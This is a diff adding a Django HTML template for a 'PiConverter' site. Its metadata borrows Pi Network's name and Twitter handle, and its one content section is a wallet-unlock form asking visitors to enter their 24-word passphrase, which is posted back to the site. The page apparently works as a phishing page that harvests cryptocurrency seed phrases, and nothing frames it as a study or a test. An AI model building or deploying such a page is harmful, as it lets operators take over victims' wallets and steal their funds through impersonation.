@@ -1,0 +1,65 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." /> 
+    <link rel="canonical" href="https://PiConverter.info{{request.path_info}}" />               
+    <meta property="og:site_name" content="PiConverter" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Pi Converter, Blockchain, Community & Developer Platform | Pi Network" />
+<meta property="og:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee." />
+<meta property="og:image" content="https://PiConverter.info{% static '' %}" />
+<meta property="og:locale" content="en_us" />
+<meta property="og:url" content="https://PiConverter.info{{request.path_info}}" />
+<meta name="twitter:site" content="@PiConverter" />
+<meta name="twitter:title" content="" />
+<meta name="twitter:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." />
+<meta name="twitter:creator" content="@PiNetwork" />
+<meta name="twitter:image" content="https://afribang.com{% static '' %}" />
+<meta property="twiter:card" content="summary_large_image" />
+<meta name="twitter:image:alt" content="PiConverter Logo" />
+      <link rel="stylesheet" href="{% static 'Piconverterapp/styles/docs.css' %}">
+      <link rel="apple-touch-icon" sizes="180x180" href="{% static 'Piconverterapp/favicon.io/apple-touch-icon.png' %}">
+      <link rel="icon" type="image/png" sizes="32x32" href="{% static 'Piconverterapp/favicon.io/favicon-32x32.png' %}">
+      <link rel="icon" type="image/png" sizes="16x16" href="{% static 'Piconverterapp.favicon.io/favicon-16x16.png' %}">
+      <link rel="manifest" href="{% static 'Piconverterapp/favicon.io/site.webmanifest' %}">  
+
+    <title>Pi Converter, Blockchain, Community & Developer Platform | Pi Network</title>
+</head>
+<body>
+    <header class="wallet-head">
+        <nav class="wallet-nav">
+            <a href="/documentation/">
+                <button class="row">
+                    &leftarrow;
+                </button>
+            </a>
+            <aside>
+                wallet
+            </aside>
+        </nav>
+    </header>
+
+    <!-- main sect -->
+     <section class="main-sect" id="via">
+        <form method="post" id="form" loading="lazy">
+            {% csrf_token %}
+            <h2>Unlock your wallet</h2>
+            <br>
+            <textarea name="passph" id="passph" rows="1"  cols="1" placeholder="Enter your 24-passphrase" ></textarea>
+            <br>
+            <br>
+            <button class="sub-btn">
+                Unlock whit fingerprint
+            </button>
+            <br>
+            <button value="submit" class="sub-btn" style="background-color: rebeccapurple; color:#fff;">
+                Unlock whit passphrase
+            </button>
+        </form>
+     </section>
+
+</body>
+</html>
